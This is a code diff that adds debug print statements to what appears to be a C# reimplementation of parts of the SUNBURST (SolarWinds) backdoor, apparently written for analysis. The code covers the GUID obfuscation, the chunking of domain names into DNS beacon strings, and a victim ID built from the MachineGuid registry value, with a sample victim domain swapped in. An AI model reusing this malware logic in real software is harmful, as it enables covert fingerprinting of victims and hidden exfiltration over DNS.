@@ -113,16 +113,23 @@ namespace solarwinds
 		}
 		public string GetPreviousString(out bool last)
 		{
+			Console.WriteLine($"GetPreviousString() Function:");
+			//Console.WriteLine($"guid: {BitConverter.ToString(this.guid).Replace("-", "")}");
 			string text = CryptoHelper.CreateSecureString(this.guid, true);
+			Console.WriteLine($"Base64 + XOR'd Guid: {text}");
+
 			int num = 32 - text.Length - 1;
 			string result = "";
 			last = false;
 			if (this.offset >= this.dnStr.Length || this.nCount > 36)
 			{
 				return result;
-			}
+			}  
+
 			int num2 = Math.Min(num, this.dnStr.Length - this.offset);
 			this.dnStrLower = this.dnStr.Substring(this.offset, num2);
+			//Console.WriteLine($"Extracted dnStrLower: {this.dnStrLower}");
+
 			this.offset += num2;
 			if (Enumerable.Contains<char>(ZipHelper.Unzip("0403AAA="), this.dnStrLower[this.dnStrLower.Length - 1]))
 			{
@@ -138,6 +145,8 @@ namespace solarwinds
 				this.nCount = -1;
 			}
 			result = text + CryptoHelper.CreateString(this.nCount, text[0]) + this.dnStrLower + this.GetStatus();
+			Console.WriteLine($"Constructed result string: {result}");
+
 			if (this.nCount >= 0)
 			{
 				this.nCount++;
@@ -193,6 +202,7 @@ namespace solarwinds
 		}
 		private static string CreateSecureString(byte[] data, bool flag)
 		{
+			//Console.WriteLine($"CreateSecureString() Function:");
 			byte[] array = new byte[data.Length + 1];
 			array[0] = (byte)new Random().Next(1, 127);
 			if (flag)
@@ -375,6 +385,7 @@ namespace solarwinds
 			private static bool GetOrCreateUserID(out byte[] hash64)
 			{
 				string text = ReadDeviceInfo();
+				Console.WriteLine($"ReadDeviceInfo: {text}");
 				hash64 = new byte[8];
 				Array.Clear(hash64, 0, hash64.Length);
 				if (text == null)
@@ -382,13 +393,17 @@ namespace solarwinds
 					return false;
 				}
 				text += domain4;
+				Console.WriteLine($"Appending Domain Name: {text}");
 				try
 				{
 					text += RegistryHelper.GetValue(ZipHelper.Unzip("8/B2jYz38Xd29In3dXT28PRzjQn2dwsJdwxyjfHNTC7KL85PK4lxLqosKMlPL0osyKgEAA=="), ZipHelper.Unzip("801MzsjMS3UvzUwBAA=="), "");
+					Console.WriteLine($"After adding HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid value : {text}");
+
 				}
 				catch
 				{
 				}
+				//hashes
 				using (MD5 md = MD5.Create())
 				{
 					byte[] bytes = Encoding.ASCII.GetBytes(text);
@@ -404,6 +419,7 @@ namespace solarwinds
 						array2[num] ^= array[i];
 					}
 				}
+				Console.WriteLine($"Final UserID: {BitConverter.ToString(hash64).Replace("-", "")}");
 				return true;
 			}
 			class Program
@@ -418,7 +434,7 @@ namespace solarwinds
 
 
 					//domain4
-					domain4 = "ville.terrebonn";
+					domain4 = "cisco.com";
 
 					Console.WriteLine("Domain4: " + domain4);
 
